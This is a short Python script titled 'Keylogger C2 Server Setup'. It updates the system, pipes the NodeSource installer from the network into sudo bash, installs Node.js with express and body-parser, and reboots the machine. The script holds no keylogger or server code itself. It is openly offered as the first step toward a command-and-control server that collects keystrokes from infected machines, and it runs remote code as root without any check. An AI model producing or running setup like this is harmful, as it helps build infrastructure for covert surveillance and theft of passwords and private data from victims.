#!/usr/bin/env python3
import subprocess
import sys
import time

def run(cmd):
    print(f"[+] {cmd}")
    subprocess.run(cmd, shell=True, check=True)

def main():
    print("=== Keylogger C2 Server Setup ===\n")
    run("sudo apt update -y")
    run("sudo apt upgrade -y")
    run("curl -fsSL https://deb.nodesource.com/setup_18.x | sudo -E bash -")
    run("sudo apt install -y nodejs")
    run("npm init -y")
    run("npm install express body-parser")
    print("\n[✓] Setup completed. Rebooting in 5 seconds...")
    time.sleep(5)
    run("sudo reboot")

if __name__ == "__main__":
    main()
